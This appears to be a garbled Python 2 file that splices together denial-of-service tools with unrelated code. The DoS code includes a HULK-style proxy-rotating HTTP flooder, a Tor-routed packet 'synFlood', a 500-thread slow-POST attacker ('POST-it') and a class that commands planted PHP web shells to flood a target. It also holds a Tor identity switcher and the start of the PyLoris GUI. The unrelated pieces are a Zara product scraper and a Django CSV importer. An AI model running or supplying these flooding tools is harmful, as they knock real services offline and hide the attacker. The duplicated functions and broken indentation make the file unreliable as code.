        keyword_top.append('windows')
        keyword_top.append('quick weight loss diet')
        keyword_top.append('omegle')
        keyword_top.append('comment')
        keyword_top.append('tips lose weight')
        keyword_top.append('account')
        keyword_top.append('health')
        keyword_top.append('business')
        keyword_top.append('free photography stock')
        keyword_top.append('110')
	keyword_top.append('vietnam')
	keyword_top.append('singapore')	
        keyword_top.append('all 150')
	return(keyword_top)
	
#builds random asscii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)
									
def httpcall(url):
        useragent_list()
        referer_list()
        keyword_list()
        code=0
        if url.count("?")>0:
                param_joiner="&"
        else:
                param_joiner="?"
        request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
        request.add_header('User-Agent', random.choice(headers_useragents))
        request.add_header('Cache-Control', 'no-cache')
        request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
        #request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
        request.add_header('Referer', random.choice(headers_referers)+random.choice(keyword_top))
        #request.add_header('Referer', host)
        request.add_header('Keep-Alive', random.randint(110,120))
        request.add_header('Connection', 'keep-alive')
        request.add_header('Host',host)
        index = random.randint(0,len(listaproxy)-1)
        proxy = urllib2.ProxyHandler({'http':listaproxy[index]})
        opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
        urllib2.install_opener(opener)
        try:
                        urllib2.urlopen(request)
                        if(flag==1): set_flag(0)
                        if(code==500): code=0
        except urllib2.HTTPError, e:
                        set_flag(1)
                        #print 'Response Code 500'
                        code=500
        except urllib2.URLError, e:
                        sys.exit()
        else:
                        inc_counter()
                        urllib2.urlopen(request)

def parse_item(self, response) :
        sel = Selector (response)
        items = []
        item = ZaraItem ()
        item['url'] = response.request.url
        title = sel.xpath ('//div[@class="right"]//header/h1//text()').extract()
        if title :
                item['title'] = title
        item['ref'] = sel.xpath ('//p[@class="reference"]//text()').extract()
        item['price'] = sel.xpath ('//p[@class="price"]/span[@class="price"]/@data-price').extract()
        desc = sel.xpath ('//p[@class="description"]/text()').extract()
        if desc :
                item['desc'] = desc
        item['img'] = sel.xpath ('//div[@class="imgCont"]//img/@src').extract()
        item['img_color'] = sel.xpath ('//span/i[@class="icon icon-arrow-down-color"]//text()').extract()
        if item['title'] and item['ref'] :
                return item						

def import_file(request, pk):
    mensaje = ''
    context = locals()
    if request.method == 'POST':
        try:
            file = request.FILES['archivo']
            dataReader = csv.DictReader(file, delimiter=';')
            if (pk=='1'):
                for x in dataReader:
                    modelo = EERR()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.kilo = transformarKilos(x['Kilos'])
                    modelo.venta = transformarPrecios(x['Venta'])
                    modelo.ingreso = transformarPrecios(x['Total Ingresos'])
                    modelo.gasto = transformarPrecios(x['Total Gastos'])
                    modelo.margen_peso = transformarPrecios(x['Margen'])
                    modelo.margen_porc = float(transformarPorcentajes(x['Margen %'])) / 100
                    modelo.save()
                    mensaje = 'El reporte Estado de Resultado, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 1)
            elif (pk=='2'):
                for x in dataReader:
                    modelo = Kilos()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.tipoCliente_id = x['Tipo de cliente']
                    modelo.kilos = transformarKilos(x['Kilos Venta'])
                    modelo.save()
                    mensaje = 'El reporte Kilos, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 2)
            elif (pk=='3'):
                for x in dataReader:
                    modelo = PrecioPromedio()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.tipoCliente_id = x['Tipo de cliente']
                    modelo.sector_id = x['Sector']
                    modelo.kilo = transformarKilos(x['Kilos Venta'])
                    modelo.neto = transformarNetos(x['Venta Neta'])
                    modelo.save()
                    mensaje = 'El reporte Precio Promedio vs Zona, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 3)
            elif (pk=='4'):
                for x in dataReader:
                    modelo = Descuento()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.tipoCliente_id = x['Tipo de Cliente']
                    modelo.sector_id = x['Sector']
                    modelo.cadena_id = x['Cadena']
                    modelo.rut = x['Rut']
                    modelo.tipoPedido = x['Tipo Pedido']
                    if (x['Kilos  Facturados'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.kilo = transformarKilosSinKG(x['Kilos  Facturados'])
                    if (x['P.Base'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.base = transformarKilosSinKG(x['P.Base'])
                    if (x['P.Especial'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.especial = transformarKilosSinKG(x['P.Especial'])
                    if (x['P.Vigente'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.vigente = transformarKilosSinKG(x['P.Vigente'])
                    if (x['P.Pedido'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.pedido = transformarKilosSinKG(x['P.Pedido'])
                    if (x['P.Facturado'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.facturado = transformarKilosSinKG(x['P.Facturado'])
                    modelo.save()
                    mensaje = 'El reporte Precios y Descuentos, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 4)
            elif (pk=='5'):
                for x in dataReader:
                    modelo = Gasto()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.sector_id = int(x['Sector'])
                    modelo.clasecoste_id = x['Clase de coste']
                    if x['Monto'] == '':
                        modelo.kilo = 0
                    else:
                        modelo.gasto = transformarPrecios(x['Monto'])
                    modelo.save()
                    mensaje = 'El reporte Costos Unitarios, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 5)
            elif (pk=='6'):
                for x in dataReader:
                    modelo = VentaCompleta()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.sector_id = int(x['Sector'])
                    modelo.tipoCliente_id = x['Tipo de cliente']
                    modelo.cliente = x['Cod Local']
                    modelo.categoria_id = x['Categoria Cliente']
                    modelo.fecha = transformarFechas(x['Dia natural'])
                    modelo.supervisor = x['Supervisor_BP-CL']
                    modelo.preventa = x['Preventa_BP-CL']
                    if x['Unidades Venta'] == '':
                        modelo.unidad = 0
                    else:
                        modelo.unidad = transformarNetos(x['Unidades Venta'])
                    if x['Kilos Venta'] == '':
                        modelo.kilo = 0
                    else:
                        modelo.kilo = transformarKilosSinKG(x['Kilos Venta'])
                    if x['Venta Neta'] == '':
                        modelo.neto = 0
                    else:
                        modelo.neto = transformarNetos(x['Venta Neta'])
                    modelo.codigoMaterial = x['Cod Material']
                    modelo.material = x['Material']
                    modelo.nivel2 = x['Nivel 2']
                    modelo.nivel3 = x['Nivel 3']
                    modelo.marca = x['Marca']
                    modelo.referencia = x['Referencia']
                    modelo.save()
                    mensaje = 'El reporte Formula de Ingreso, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 6)
            else:
                mensaje = 'Este importe no ha sido programado'
        except Exception, e:
            mensaje = 'Ha ocurrido un error interno, por favor vuelva a intentarlo: ' + str(e)
            print(str(e))
    return render(request, 'imports/success_import.html', {'mensaje': mensaje, 'context': context})

def data_exist_eerr(request, pk):
    consulta = EERR.objects.all().filter(periodo__id=pk)
    if consulta.count() == 0:
        retorno = 0
    else:
        retorno = 1
    json_data = json.dumps({'retorno': retorno})
    return HttpResponse(json_data, content_type='application/json; charset=utf8')

def data_exist_pp_vs_zn(request, pk):
    consulta = PrecioPromedio.objects.all().filter(periodo__id=pk)
    if consulta.count() == 0:
        retorno = 0
    else:
        retorno = 1
    json_data = json.dumps({'retorno': retorno})
    return HttpResponse(json_data, content_type='application/json; charset=utf8')

def data_exist_precio_desc(request, pk):
    consulta = Descuento.objects.all().filter(periodo__id=pk)
    if consulta.count() == 0:
        retorno = 0
    else:
        retorno = 1
    json_data = json.dumps({'retorno': retorno})
    return HttpResponse(json_data, content_type='application/json; charset=utf8')

def data_exist_unit(request, pk):
    consulta = Gasto.objects.all().filter(periodo__id=pk)
    if consulta.count() == 0:
        retorno = 0
    else:
        retorno = 1
    json_data = json.dumps({'retorno': retorno})
    return HttpResponse(json_data, content_type='application/json; charset=utf8')

def data_exist_formula_ingreso(request, pk):
    consulta = VentaCompleta.objects.all().filter(periodo__id=pk)
    if consulta.count() == 0:
        retorno = 0
    else:
        retorno = 1
    json_data = json.dumps({'retorno': retorno})
    return HttpResponse(json_data, content_type='application/json; charset=utf8')

def transformarKilos(kilos):
    return kilos.replace('KG', '').replace('.', '').replace(',', '.')

def transformarKilosSinKG(kilos):
    return kilos.replace('.', '').replace(',', '.')

def transformarNetos(netos):
    return netos.replace('.', '')

def transformarPrecios(netos):
    return netos.replace('CLP', '').replace('.', '')

def transformarPorcentajes(porcentajes):
    return porcentajes.replace('%', '').replace(',', '.')						
 
#http request
def httpcall(url):
        useragent_list()
        referer_list()
        keyword_list()
        code=0
        if url.count("?")>0:
                param_joiner = "&"
        else:
                param_joiner = "?"
        request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
        request.add_header('User-Agent', random.choice(headers_useragents))
        request.add_header('Cache-Control', 'no-cache')
        request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
        request.add_header('Referer', random.choice(headers_referers)+random.choice(keyword_top))
        request.add_header('Keep-Alive', random.randint(110,120))
        request.add_header('Connection', 'keep-alive')
        request.add_header('Host',host)
        proxy = urllib2.ProxyHandler({'http':listaproxy[index]})
        opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
        urllib2.install_opener(opener) 
        try:
                        urllib2.urlopen(request)
                        if(flag==1): set_flag(0)
                        if(code==1000000000): code=1000000000
        except urllib2.HTTPError, e:
                        set_flag(1)
                        code=1000000000
                        time.sleep(6)
        except urllib2.URLError, e:
                        sys.exit()
        else:
                        inc_counter()
                        urllib2.urlopen(request)
        #print 'size: '+str(len(ips))+'\n'
        index = random.randint(0,len(ips)-1)
        #print 'http:'+ips[index];
        proxy = urllib2.ProxyHandler({'http':ips[index]})#proxy = urllib2.ProxyHandler({'http':random.choice(ips)})
        opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
        urllib2.install_opener(opener) 
        try:
                        urllib2.urlopen(request)
                        if(flag==1): set_flag(0)
                        if(code==500): code=0
        except urllib2.HTTPError, e:
                        #print e.code
                        set_flag(1)
                        print 'Response Code 500'
                        code=500
                        #print "Start : %s" % time.ctime()
                        time.sleep(60)
                        #print "End : %s" % time.ctime()
        except urllib2.URLError, e:
#print e.reason
                        sys.exit()
        else:
                        inc_counter()
                        urllib2.urlopen(request)	
						
						
def setdefaultproxy(proxytype=None,addr=None,port=None,rdns=True,username=None,password=None):
        """setdefaultproxy(proxytype, addr[, port[, rdns[, username[, password]]]])
        Sets a default proxy which all further socksocket objects will use,
        unless explicitly changed.
        """
        global _defaultproxy
        _defaultproxy = (proxytype,addr,port,rdns,username,password)
       
class socksocket(socket.socket):
        """socksocket([family[, type[, proto]]]) -> socket object
       
        Open a SOCKS enabled socket. The parameters are the same as
        those of the standard socket init. In order for SOCKS to work,
        you must specify family=AF_INET, type=SOCK_STREAM and proto=0.
        """
       
def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, _sock=None):
                _orgsocket.__init__(self,family,type,proto,_sock)
                if _defaultproxy != None:
                        self.__proxy = _defaultproxy
                else:
                        self.__proxy = (None, None, None, None, None, None)
                self.__proxysockname = None
                self.__proxypeername = None
       
def __recvall(self, bytes):
                """__recvall(bytes) -> data
                Receive EXACTLY the number of bytes requested from the socket.
                Blocks until the required number of bytes have been received.
                """
                data = ""
                while len(data) < bytes:
                        data = data + self.recv(bytes-len(data))
                return data
       
def setproxy(self,proxytype=None,addr=None,port=None,rdns=True,username=None,password=None):
                """setproxy(proxytype, addr[, port[, rdns[, username[, password]]]])
                Sets the proxy to be used.
                proxytype -     The type of the proxy to be used. Three types
                                are supported: PROXY_TYPE_SOCKS4 (including socks4a),
                                PROXY_TYPE_SOCKS5 and PROXY_TYPE_HTTP
                addr -          The address of the server (IP or DNS).
                port -          The port of the server. Defaults to 1080 for SOCKS
                                servers and 8080 for HTTP proxy servers.
                rdns -          Should DNS queries be preformed on the remote side
                                (rather than the local side). The default is True.
                                Note: This has no effect with SOCKS4 servers.
                username -      Username to authenticate with to the server.
                                The default is no authentication.
                password -      Password to authenticate with to the server.
                                Only relevant when username is also provided.
                """
                self.__proxy = (proxytype,addr,port,rdns,username,password)
       
def __negotiatesocks5(self,destaddr,destport):
                """__negotiatesocks5(self,destaddr,destport)
                Negotiates a connection through a SOCKS5 server.
                """
                # First we'll send the authentication packages we support.
                if (self.__proxy[4]!=None) and (self.__proxy[5]!=None):
                        # The username/password details were supplied to the
                        # setproxy method so we support the USERNAME/PASSWORD
                        # authentication (in addition to the standard none).
                        self.sendall("\x05\x02\x00\x02")
                else:
                        # No username/password were entered, therefore we
                        # only support connections with no authentication.
                        self.sendall("\x05\x01\x00")
                # We'll receive the server's response to determine which
                # method was selected
                chosenauth = self.__recvall(2)
                if chosenauth[0] != "\x05":
                        self.close()
                        raise GeneralProxyError((1,_generalerrors[1]))
                # Check the chosen authentication method
                if chosenauth[1] == "\x00":
                        # No authentication is required
                        pass
                elif chosenauth[1] == "\x02":
                        # Okay, we need to perform a basic username/password
                        # authentication.
                        self.sendall("\x01" + chr(len(self.__proxy[4])) + self.__proxy[4] + chr(len(self.proxy[5])) + self.__proxy[5])
                        authstat = self.__recvall(2)
                        if authstat[0] != "\x01":
                                # Bad response
                                self.close()
                                raise GeneralProxyError((1,_generalerrors[1]))
                        if authstat[1] != "\x00":
                                # Authentication failed
                                self.close()
                                raise Socks5AuthError,((3,_socks5autherrors[3]))
                        # Authentication succeeded
                else:
                        # Reaching here is always bad
                        self.close()
                        if chosenauth[1] == "\xFF":
                                raise Socks5AuthError((2,_socks5autherrors[2]))
                        else:
                                raise GeneralProxyError((1,_generalerrors[1]))
                # Now we can request the actual connection
                req = "\x05\x01\x00"
                # If the given destination address is an IP address, we'll
                # use the IPv4 address request even if remote resolving was specified.
                try:
                        ipaddr = socket.inet_aton(destaddr)
                        req = req + "\x01" + ipaddr
                except socket.error:
                        # Well it's not an IP number,  so it's probably a DNS name.
                        if self.__proxy[3]==True:
                                # Resolve remotely
                                ipaddr = None
                                req = req + "\x03" + chr(len(destaddr)) + destaddr
                        else:
                                # Resolve locally
                                ipaddr = socket.inet_aton(socket.gethostbyname(destaddr))
                                req = req + "\x01" + ipaddr
                req = req + struct.pack(">H",destport)
                self.sendall(req)
                # Get the response
                resp = self.__recvall(4)
                if resp[0] != "\x05":
                        self.close()
                        raise GeneralProxyError((1,_generalerrors[1]))
                elif resp[1] != "\x00":
                        # Connection failed
                        self.close()
                        if ord(resp[1])<=8:
                                raise Socks5Error(ord(resp[1]),_generalerrors[ord(resp[1])])
                        else:
                                raise Socks5Error(9,_generalerrors[9])
                # Get the bound address/port
                elif resp[3] == "\x01":
                        boundaddr = self.__recvall(4)
                elif resp[3] == "\x03":
                        resp = resp + self.recv(1)
                        boundaddr = self.__recvall(resp[4])
                else:
                        self.close()
                        raise GeneralProxyError((1,_generalerrors[1]))
                boundport = struct.unpack(">H",self.__recvall(2))[0]
                self.__proxysockname = (boundaddr,boundport)
                if ipaddr != None:
                        self.__proxypeername = (socket.inet_ntoa(ipaddr),destport)
                else:
                        self.__proxypeername = (destaddr,destport)
       
def getproxysockname(self):
                """getsockname() -> address info
                Returns the bound IP address and port number at the proxy.
                """
                return self.__proxysockname
       
def getproxypeername(self):
                """getproxypeername() -> address info
                Returns the IP and port number of the proxy.
                """
                return _orgsocket.getpeername(self)
       
def getpeername(self):
                """getpeername() -> address info
                Returns the IP address and port number of the destination
                machine (note: getproxypeername returns the proxy)
                """
                return self.__proxypeername
       
def __negotiatesocks4(self,destaddr,destport):
                """__negotiatesocks4(self,destaddr,destport)
                Negotiates a connection through a SOCKS4 server.
                """
                # Check if the destination address provided is an IP address
                rmtrslv = False
                try:
                        ipaddr = socket.inet_aton(destaddr)
                except socket.error:
                        # It's a DNS name. Check where it should be resolved.
                        if self.__proxy[3]==True:
                                ipaddr = "\x00\x00\x00\x01"
                                rmtrslv = True
                        else:
                                ipaddr = socket.inet_aton(socket.gethostbyname(destaddr))
                # Construct the request packet
                req = "\x04\x01" + struct.pack(">H",destport) + ipaddr
                # The username parameter is considered userid for SOCKS4
                if self.__proxy[4] != None:
                        req = req + self.__proxy[4]
                req = req + "\x00"
                # DNS name if remote resolving is required
                # NOTE: This is actually an extension to the SOCKS4 protocol
                # called SOCKS4A and may not be supported in all cases.
                if rmtrslv==True:
                        req = req + destaddr + "\x00"
                self.sendall(req)
                # Get the response from the server
                resp = self.__recvall(8)
                if resp[0] != "\x00":
                        # Bad data
                        self.close()
                        raise GeneralProxyError((1,_generalerrors[1]))
                if resp[1] != "\x5A":
                        # Server returned an error
                        self.close()
                        if ord(resp[1]) in (91,92,93):
                                self.close()
                                raise Socks4Error((ord(resp[1]),_socks4errors[ord(resp[1])-90]))
                        else:
                                raise Socks4Error((94,_socks4errors[4]))
                # Get the bound address/port
                self.__proxysockname = (socket.inet_ntoa(resp[4:]),struct.unpack(">H",resp[2:4])[0])
                if rmtrslv != None:
                        self.__proxypeername = (socket.inet_ntoa(ipaddr),destport)
                else:
                        self.__proxypeername = (destaddr,destport)
       
def __negotiatehttp(self,destaddr,destport):
                """__negotiatehttp(self,destaddr,destport)
                Negotiates a connection through an HTTP server.
                """
                # If we need to resolve locally, we do this now
                if self.__proxy[3] == False:
                        addr = socket.gethostbyname(destaddr)
                else:
                        addr = destaddr
                self.sendall("CONNECT " + addr + ":" + str(destport) + " HTTP/1.1\r\n" + "Host: " + destaddr + "\r\n\r\n")
                # We read the response until we get the string "\r\n\r\n"
                resp = self.recv(1)
                while resp.find("\r\n\r\n")==-1:
                        resp = resp + self.recv(1)
                # We just need the first line to check if the connection
                # was successful
                statusline = resp.splitlines()[0].split(" ",2)
                if statusline[0] not in ("HTTP/1.0","HTTP/1.1"):
                        self.close()
                        raise GeneralProxyError((1,_generalerrors[1]))
                try:
                        statuscode = int(statusline[1])
                except ValueError:
                        self.close()
                        raise GeneralProxyError((1,_generalerrors[1]))
                if statuscode != 200:
                        self.close()
                        raise HTTPError((statuscode,statusline[2]))
                self.__proxysockname = ("0.0.0.0",0)
                self.__proxypeername = (addr,destport)
       
def connect(self,destpair):
                """connect(self,despair)
                Connects to the specified destination through a proxy.
                destpar - A tuple of the IP/DNS address and the port number.
                (identical to socket's connect).
                To select the proxy server use setproxy().
                """
                # Do a minimal input check first
                if (type(destpair) in (list,tuple)==False) or (len(destpair)<2) or (type(destpair[0])!=str) or (type(destpair[1])!=int):
                        raise GeneralProxyError((5,_generalerrors[5]))
                if self.__proxy[0] == PROXY_TYPE_SOCKS5:
                        if self.__proxy[2] != None:
                                portnum = self.__proxy[2]
                        else:
                                portnum = 1080
                        _orgsocket.connect(self,(self.__proxy[1],portnum))
                        self.__negotiatesocks5(destpair[0],destpair[1])
                elif self.__proxy[0] == PROXY_TYPE_SOCKS4:
                        if self.__proxy[2] != None:
                                portnum = self.__proxy[2]
                        else:
                                portnum = 1080
                        _orgsocket.connect(self,(self.__proxy[1],portnum))
                        self.__negotiatesocks4(destpair[0],destpair[1])
                elif self.__proxy[0] == PROXY_TYPE_HTTP:
                        if self.__proxy[2] != None:
                                portnum = self.__proxy[2]
                        else:
                                portnum = 8080
                        _orgsocket.connect(self,(self.__proxy[1],portnum))
                        self.__negotiatehttp(destpair[0],destpair[1])
                elif self.__proxy[0] == None:
                        _orgsocket.connect(self,(destpair[0],destpair[1]))
                else:
                        raise GeneralProxyError((4,_generalerrors[4]))	
			
class ProxyError(Exception):
        def __init__(self, value):
                self.value = value
        def __str__(self):
                return repr(self.value)
 
class GeneralProxyError(ProxyError):
        def __init__(self, value):
                self.value = value
        def __str__(self):
                return repr(self.value)
 
class Socks5AuthError(ProxyError):
        def __init__(self, value):
                self.value = value
        def __str__(self):
                return repr(self.value)
 
class Socks5Error(ProxyError):
        def __init__(self, value):
                self.value = value
        def __str__(self):
                return repr(self.value)
 
class Socks4Error(ProxyError):
        def __init__(self, value):
                self.value = value
        def __str__(self):
                return repr(self.value)
 
class HTTPError(ProxyError):
        def __init__(self, value):
                self.value = value
        def __str__(self):
                return repr(self.value)	
											
class synFlood(threading.Thread):
    def __init__(self, host, port):
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.socks = socks.socksocket()
        self.tor = tor
        self.running = True
               
    def _send_http_get(self, pause = random.randrange(1, 10)):
        global stop_now
        self.socks.send("GET / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Accept: image/png,*/*;q=0.5\r\n"
                        "Cache-Control: no-cache, max-age=0\r\n"
                        "Connection: keep-alive\r\n"
                        "Keep-Alive: 120\r\n"
                        "Content-Length: 42\r\n"
                        #"Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
                        (self.host, random.choice(useragents)))
 
        for i in range(0, 9999):
            if stop_now:
                self.running = False
                break
            p = random.choice(string.letters+string.digits)
            data = ['\x00','\x80\x12\x00\x01\x08\x00\x00\x00\xff\xff\xff\xe8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00\x00\x000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00']
            packet = random.choice(data)
            magic = random.choice(packet+p)
            print term.BOL+term.UP+term.CLEAR_EOL+"Sending magic packets!: %s" % packet+term.NORMAL
            self.socks.send(magic)
            time.sleep(random.uniform(0.1, 3))
       
        self.socks.close()
               
    def run(self):
        while self.running:
            while self.running:
                try:
                    if self.tor:    
                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
                    self.socks.connect((self.host, self.port))
                    print term.BOL+term.UP+term.CLEAR_EOL+"Stressing Target!..."+ term.NORMAL
                    break
                except Exception, e:
                    if e.args[0] == 106 or e.args[0] == 60:
                        break
                    print term.BOL+term.UP+term.CLEAR_EOL+"Error connecting to host..."+ term.NORMAL
                    time.sleep(1)
                    #self.socks = socks.socksocket()
                    continue
       
            while self.running:
                try:
                    self._send_http_get()
                except Exception, e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        print term.BOL+term.UP+term.CLEAR_EOL+"Thread broken, restarting..."+ term.NORMAL
                        #self.socks.close()
                        self.socks = socks.socksocket()
                        break
                    time.sleep(1)
                    pass
				     			
class MyThread(Thread,):
    def __init__(self,SITE, DOS_TYPE):
        Thread.__init__(self)
        self.method = DOS_TYPE
        self.site = SITE
        self.kill_received = False
    def run(self):
        while not self.kill_received:
            server = socket.gethostbyname(self.site)
            post = 'x' * 6000
            file = 'index.php'
 
            request = '%s /%s HTTP/1.1\r\n' %(self.method.upper(),file)
            request += 'Host: %s\r\n' % (self.site)
            request += 'User-Agent: Mozilla/5.0 (Windows; U;Windows NT 6.1; en-US; rv:1.9.2.12) Gecko/20101026Firefox/3.6.12\r\n'
            request += 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
            request += 'Accept-Language: en-us,en;q=0.5\r\n'
            request += 'Accept-Encoding: gzip,deflate\r\n'
            request += 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n'
            request += 'Keep-Alive: 900\r\n'
            request += 'Connection: keep-alive\r\n'
            request += 'Content-Type: application/x-www-form-urlencoded\r\n'
            request += 'Content-length: %s\r\n\r\n' % (len(post))
 
            newrequest = '%s\r\n' % (post)
            newrequest += '\r\n'
 
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
            try:
                s.connect((server, 80))
                s.send(request)
 
                for c in newrequest:
                    sys.stdout.write( s.send(c).__str__() )
                    time.sleep(60)
                s.close()
                #s.recv(50000)
            except:
                print "Is It Dead Yet?"
 
def da_delegator(SITE,DOS_TYPE):
    thread_count = 500
    print '=' * 60
    print 'POST-it v1.1.0'.center(60,'-')
    print '=' * 60
    threads = []
    for num in range(thread_count):
        thr1=MyThread(SITE,DOS_TYPE)
        print 'start - %s' % thr1
        thr1.start()
        threads.append(thr1)
        #thr1.join()
 
    while len(threads) > 0:
            try:
                # Join all threads using a timeout so it doesn't block
                # Filter out threads which have been joined or are None
                threads = [t.join(1) for t in threads if t is not
None and t.isAlive()]
            except KeyboardInterrupt:
                print "Ctrl-c received! Sending kill to threads... Just Kill The Terminal" # Need to fix this!!!
                for t in threads:
                    t.kill_received = True
                    sys.exit(2)					
					
class DenialOfService:
        def __init__(self):
                self.Settings = {      
                        'ip': '',
                        'port': 80,
                        'time': 50
                }
                self.IP, self.Port, self.Time = self.Settings['ip'], self.Settings['port'], str(self.Settings['time'])
               
                self.Shells = [i.strip() for i in open('shells.txt','r')]
                for (Shell) in izip(self.Shells):
                        Shell = ''.join(Shell)
                        self.Shell = str(Shell).strip("'")
                        try:
                                print '''Shell loaded: ''' + self.Shell
                                threading.Thread(target=self.Dos,args=()).start()
                        except:
                                pass
        def Dos(self):
                try:
                        while 1:
                                if '?' not in self.Shell:
                                        Data = self.Shell + '?act=phptools&host=' + self.IP + '&time=' + self.Time
                                        Request = urllib2.urlopen(Data).read()
                                else: pass
                except: print 'Dead shell: ' + self.Shell	
class Switcher(Tk):
    def __init__(self):
        Tk.__init__(self)
        self.title(string = ".o0O| TOR Switcher |O0o.")

        self.host = StringVar()
        self.port = IntVar()
        self.passwd = StringVar()
        self.time = DoubleVar()

        self.host.set('localhost')
        self.port.set('9051')
        self.passwd.set('')
        self.time.set('30')

        Label(self, text = 'Host:').grid(row = 1, column = 1)
        Label(self, text = 'Port:').grid(row = 2, column = 1)
        Label(self, text = 'Password:').grid(row = 3, column = 1)
        Label(self, text = 'Interval:').grid(row = 4, column = 1)

        Entry(self, textvariable = self.host).grid(row = 1, column = 2, columnspan = 2)
        Entry(self, textvariable = self.port).grid(row = 2, column = 2, columnspan = 2)
        Entry(self, textvariable = self.passwd, show = '*').grid(row = 3, column = 2, columnspan = 2)
        Entry(self, textvariable = self.time).grid(row = 4, column = 2, columnspan = 2)

        Button(self, text = 'Start', command = self.start).grid(row = 5, column = 2)
        Button(self, text = 'Stop', command = self.stop).grid(row = 5, column = 3)

        self.output = Text(self, foreground="white", background="black", highlightcolor="white", highlightbackground="purple", wrap=WORD, height = 8, width = 40)
        self.output.grid(row = 1, column = 4, rowspan = 5)

    def start(self):
        self.write('TOR Switcher starting.')
        self.ident = random.random()
        thread.start_new_thread(self.newnym, ())

    def stop(self):
        try:
            self.write('TOR Switcher stopping.')
        except:
            pass
        self.ident = random.random()

    def write(self, message):
        t = time.localtime()
        try:
            self.output.insert(END, '[%02i:%02i:%02i] %s\n' % (t[3], t[4], t[3], message))
        except:
            print('[%02i:%02i:%02i] %s\n' % (t[3], t[4], t[3], message))
            
    def newnym(self):
        key = self.ident
        host = self.host.get()
        port = self.port.get()
        passwd = self.passwd.get()
        interval = self.time.get()

        try:
            tn = telnetlib.Telnet(host, port)
            if passwd == '':
                tn.write("AUTHENTICATE\r\n")
            else:
                tn.write("AUTHENTICATE \"%s\"\r\n" % (passwd))
            res = tn.read_until('250 OK', 5)

            if res.find('250 OK') > -1:
                self.write('AUTHENTICATE accepted.')
            else:
                self.write('Control responded "%s".')
                key = self.ident + 1
                self.write('Quitting.')
        except Exception, ex:
            self.write('There was an error: %s.' % (ex))
            key = self.ident + 1
            self.write('Quitting.')
        
        while key == self.ident:
            try:
                tn.write("signal NEWNYM\r\n")
                res = tn.read_until('250 OK', 5)
                if res.find('250 OK') > -1:
                    self.write('New identity established.')
                else:
                    self.write('Control responded "%s".')
                    key = self.ident + 1
                    self.write('Quitting.')
                time.sleep(interval)
            except Exception, ex:
                self.write('There was an error: %s.' % (ex))
                key = self.ident + 1
                self.write('Quitting.')

        try:
            tn.write("QUIT\r\n")
            tn.close()
        except:
            pass
            
class MainWindow(Tk):
    def __init__(self):
        Tk.__init__(self)
        self.title(string = ".o0O| PyLoris |O0o.")
        self.lws = []

        self.options = {
            'host' : StringVar(),
            'port' : IntVar(),
            'ssl' : BooleanVar(),
            'attacklimit' : IntVar(),
            'connectionlimit' : IntVar(),
            'threadlimit' : IntVar(),
            'connectionspeed' : DoubleVar(),
            'timebetweenthreads' : DoubleVar(),
            'timebetweenconnections' : DoubleVar(),
            'quitimmediately' : BooleanVar(),
            'socksversion' : StringVar(),
            'sockshost' : StringVar(),
            'socksport' : IntVar(),
            'socksuser' : StringVar(),
            'sockspass' : StringVar(),
            'request' : StringVar(),
        }

        self.options['host'].set('localhost')
        self.options['port'].set(80)
        self.options['ssl'].set(False)
        self.options['attacklimit'].set(500)
        self.options['connectionlimit'].set(500)
        self.options['threadlimit'].set(50)
        self.options['connectionspeed'].set(0.3)
        self.options['timebetweenthreads'].set(0.3)
        self.options['timebetweenconnections'].set(1)
        self.options['quitimmediately'].set(False)
        self.options['socksversion'].set('NONE')
        self.options['sockshost'].set('localhost')
        self.options['socksport'].set(9050)
        self.options['socksuser'].set('')
        self.options['sockspass'].set('')

        gf = LabelFrame(self, text = 'General', relief = GROOVE, labelanchor = 'nw', width = 400, height = 90)
        gf.grid(row = 0, column = 1)
        gf.grid_propagate(0)
        Label(gf, text = 'Host:').grid(row = 0, column = 1)
